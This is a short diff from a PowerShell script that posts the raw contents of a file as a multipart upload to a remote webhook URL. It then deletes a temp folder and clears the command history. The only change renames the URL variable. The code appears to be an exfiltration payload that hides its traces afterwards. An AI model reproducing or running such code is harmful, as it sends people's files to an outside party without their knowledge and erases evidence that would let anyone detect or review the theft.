@@ -38,7 +38,7 @@ $(Get-Content -Raw $filePath)
 --$boundary--
 "@
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body | Out-Null
+Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $body | Out-Null
 cd ..
 rm -R \temp
 Clear-History
